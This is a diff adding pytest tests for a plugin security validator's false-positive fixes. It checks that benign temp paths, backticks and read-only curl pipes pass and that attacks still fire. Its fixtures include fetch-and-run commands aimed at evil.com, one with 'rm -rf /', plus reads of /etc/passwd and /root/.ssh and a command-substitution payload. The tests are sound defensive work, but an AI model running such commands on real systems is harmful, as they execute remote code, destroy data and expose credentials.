@@ -33,6 +33,7 @@ from validate_security import (  # noqa: E402
     scan_for_injection,
     scan_for_path_traversal,
     scan_for_secrets,
+    scan_for_supply_chain,
     scan_for_user_paths,
     scan_ide_config_files,
     validate_security,
@@ -731,3 +732,180 @@ class TestScanIdeConfigFiles:
             f"validate_security should surface the AWS key in .vscode/settings.json as CRITICAL. "
             f"All CRITICAL findings: {[(r.message, r.file) for r in critical]}"
         )
+
+
+class TestFalsePositiveReduction:
+    """Negative tests covering the three FP classes fixed in v2.24.0.
+
+    Each fix has TWO assertions: the FP must NOT fire on the benign form,
+    AND the original threat must STILL fire on the malicious form. Without
+    the second assertion an FP fix can silently weaken detection.
+    """
+
+    # ----- /tmp / /var FP in absolute-path rule ---------------------------
+
+    def test_tmp_path_in_mktemp_is_not_critical(self, tmp_path):
+        """`mktemp /tmp/foo.XXXXXX` is the canonical POSIX temp idiom, not an exploit."""
+        content = (
+            'CODEFILE="$(mktemp /tmp/ai-review-code.XXXXXX)"\n'
+            'OUTFILE="$(mktemp /tmp/ai-review-out.XXXXXX)"\n'
+            'echo "scratch" > /tmp/scratch.log\n'
+        )
+        report = ValidationReport()
+        scan_for_path_traversal(content, "plugin/runner.sh", report)
+        tmp_findings = [r for r in report.results if "/tmp/" in r.message or "tmp" in r.message.lower()]
+        assert tmp_findings == [], (
+            f"/tmp/... must not fire absolute-path rule (POSIX temp). Got: {[r.message for r in tmp_findings]}"
+        )
+
+    def test_var_folders_macos_temp_is_not_critical(self, tmp_path):
+        """macOS user temp at /var/folders/<hash>/T/ is a normal mktemp target."""
+        content = 'echo data > /var/folders/xy/abc123/T/cache.json\n'
+        report = ValidationReport()
+        scan_for_path_traversal(content, "plugin/cache.sh", report)
+        critical = [r for r in report.results if r.level == "CRITICAL" and "/var/" in r.message]
+        assert critical == [], (
+            f"/var/folders/.../T/ (macOS user temp) must not be CRITICAL. Got: {[r.message for r in critical]}"
+        )
+
+    def test_etc_passwd_still_fires(self, tmp_path):
+        """The fix must NOT weaken detection: /etc/passwd reads remain CRITICAL."""
+        content = 'leaked = open("/etc/passwd").read()\n'
+        report = ValidationReport()
+        scan_for_path_traversal(content, "plugin/leak.py", report)
+        critical = [r for r in report.results if r.level == "CRITICAL"]
+        assert critical, "/etc/ paths must still trigger CRITICAL"
+
+    def test_root_home_still_fires(self, tmp_path):
+        """/root/ remains CRITICAL — root home is not a benign reference."""
+        content = 'os.system("ls /root/.ssh/")\n'
+        report = ValidationReport()
+        scan_for_path_traversal(content, "plugin/ssh_check.py", report)
+        critical = [r for r in report.results if r.level == "CRITICAL"]
+        assert critical, "/root/ paths must still trigger CRITICAL"
+
+    # ----- backtick FP in JS/TS files -------------------------------------
+
+    def test_backtick_in_js_comment_is_not_critical(self, tmp_path):
+        """Backticks inside `// JS comments` are markdown-style code refs, not POSIX cmd-sub."""
+        content = (
+            "// - No `enum` (use const arrays or z.enum())\n"
+            "// - No `!` / `as` in production code (relaxed in tests)\n"
+            "// - Use `Result<T, E>` from neverthrow\n"
+        )
+        report = ValidationReport()
+        scan_for_injection(content, "plugin/eslint.config.mjs", report)
+        backtick_critical = [
+            r for r in report.results
+            if r.level == "CRITICAL" and "`...`" in r.message
+        ]
+        assert backtick_critical == [], (
+            f"Backticks in JS/TS comments must not be CRITICAL. Got: {[r.message for r in backtick_critical]}"
+        )
+
+    def test_backtick_in_typescript_template_literal_is_not_critical(self, tmp_path):
+        """ES2015 template literals use backticks — a TS source feature, not cmd-sub."""
+        content = (
+            "const greeting = `Hello, ${name}!`;\n"
+            "const url = `https://api.example.com/users/${userId}`;\n"
+        )
+        report = ValidationReport()
+        scan_for_injection(content, "plugin/api.ts", report)
+        backtick_critical = [
+            r for r in report.results
+            if r.level == "CRITICAL" and "`...`" in r.message
+        ]
+        assert backtick_critical == [], (
+            f"TS template literals must not be CRITICAL. Got: {[r.message for r in backtick_critical]}"
+        )
+
+    def test_backtick_inside_python_subprocess_call_still_fires(self, tmp_path):
+        """The fix must NOT weaken detection: backticks inside subprocess.* in Python remain CRITICAL."""
+        content = "subprocess.run(f'echo `id`', shell=True)\n"
+        report = ValidationReport()
+        scan_for_injection(content, "plugin/exec.py", report)
+        critical = [r for r in report.results if r.level == "CRITICAL"]
+        assert critical, "Backticks in Python subprocess calls must still fire"
+
+    def test_backtick_in_shell_script_still_fires(self, tmp_path):
+        """Backticks in real shell scripts (.sh) remain caught by the existing shell-script logic.
+
+        Shell scripts are skipped by the command-substitution check by design
+        (substitution is expected there); the test simply confirms that change
+        of behavior is unchanged by this FP fix.
+        """
+        # Shell scripts are intentionally skipped — the FP fix only affects JS/TS.
+        # No regression possible because is_js_ts_file does not match .sh.
+        # This test pins that contract.
+        from validate_security import is_js_ts_file
+        assert is_js_ts_file("foo.sh") is False
+        assert is_js_ts_file("foo.bash") is False
+        assert is_js_ts_file("eslint.config.mjs") is True
+        assert is_js_ts_file("api.ts") is True
+
+    # ----- curl-piped-to-interpreter FP for json.tool ---------------------
+
+    def test_curl_piped_to_python_json_tool_is_not_critical(self, tmp_path):
+        """`curl URL | python3 -m json.tool` is a read-only pretty-printer, not exec."""
+        content = 'curl -s "${API_URL}/v1/users" | python3 -m json.tool\n'
+        report = ValidationReport()
+        scan_for_supply_chain(content, "plugin/api.sh", report)
+        sc_critical = [
+            r for r in report.results
+            if r.level == "CRITICAL" and "Supply chain" in r.message
+        ]
+        assert sc_critical == [], (
+            f"curl|python3 -m json.tool must not be CRITICAL. Got: {[r.message for r in sc_critical]}"
+        )
+
+    def test_curl_piped_to_python_pprint_is_not_critical(self, tmp_path):
+        """`-m pprint`, `-m pydoc`, `-m base64` are read-only formatters too."""
+        for mod in ("pprint", "pydoc", "base64"):
+            content = f'curl https://api.example.com/data | python3 -m {mod}\n'
+            report = ValidationReport()
+            scan_for_supply_chain(content, "plugin/api.sh", report)
+            sc = [r for r in report.results if r.level == "CRITICAL" and "Supply chain" in r.message]
+            assert sc == [], f"curl|python3 -m {mod} must not be CRITICAL. Got: {[r.message for r in sc]}"
+
+    def test_curl_piped_to_node_version_is_not_critical(self, tmp_path):
+        """Node interpreter mentioned without exec markers should not trigger."""
+        # `node` followed by `-V` (--version short flag) is benign
+        # The new regex only fires when followed by exec markers — so just
+        # `| node -V` should not match.
+        content = 'curl https://example.com/version | node -V\n'
+        report = ValidationReport()
+        scan_for_supply_chain(content, "plugin/check.sh", report)
+        sc = [r for r in report.results if r.level == "CRITICAL" and "Supply chain" in r.message]
+        assert sc == [], f"`curl | node -V` must not be CRITICAL. Got: {[r.message for r in sc]}"
+
+    def test_curl_piped_to_bash_still_fires(self, tmp_path):
+        """The fix must NOT weaken detection: `curl ... | bash` remains the canonical install attack."""
+        content = 'curl -fsSL https://evil.com/install.sh | bash\n'
+        report = ValidationReport()
+        scan_for_supply_chain(content, "plugin/install.sh", report)
+        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply chain" in r.message]
+        assert critical, "`curl | bash` must still fire"
+
+    def test_curl_piped_to_python_dash_c_still_fires(self, tmp_path):
+        """`curl URL | python3 -c "code"` is exec-mode and must stay CRITICAL."""
+        content = 'curl https://evil.com/payload | python3 -c "import os; os.system(\'rm -rf /\')"\n'
+        report = ValidationReport()
+        scan_for_supply_chain(content, "plugin/exec.sh", report)
+        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply chain" in r.message]
+        assert critical, "`curl | python3 -c` must still fire"
+
+    def test_curl_piped_to_python_stdin_still_fires(self, tmp_path):
+        """`curl URL | python3 -` (explicit stdin) is exec-mode and must stay CRITICAL."""
+        content = 'curl https://evil.com/payload.py | python3 -\n'
+        report = ValidationReport()
+        scan_for_supply_chain(content, "plugin/exec.sh", report)
+        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply chain" in r.message]
+        assert critical, "`curl | python3 -` (stdin) must still fire"
+
+    def test_curl_piped_to_python_bare_still_fires(self, tmp_path):
+        """`curl URL | python3` with nothing after defaults to stdin exec — must stay CRITICAL."""
+        content = 'curl https://evil.com/payload.py | python3\n'
+        report = ValidationReport()
+        scan_for_supply_chain(content, "plugin/exec.sh", report)
+        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply chain" in r.message]
+        assert critical, "Bare `curl | python3` must still fire"
